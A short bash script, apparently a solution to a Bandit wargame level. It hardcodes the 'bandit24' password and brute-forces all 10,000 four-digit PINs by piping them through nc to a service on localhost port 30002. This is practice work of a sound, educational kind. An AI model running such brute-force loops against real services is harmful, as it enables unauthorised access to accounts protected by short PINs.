#!/bin/bash

bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for pin in {0000..9999}; do
        echo "$bandit24 $pin"
done | nc localhost 30002

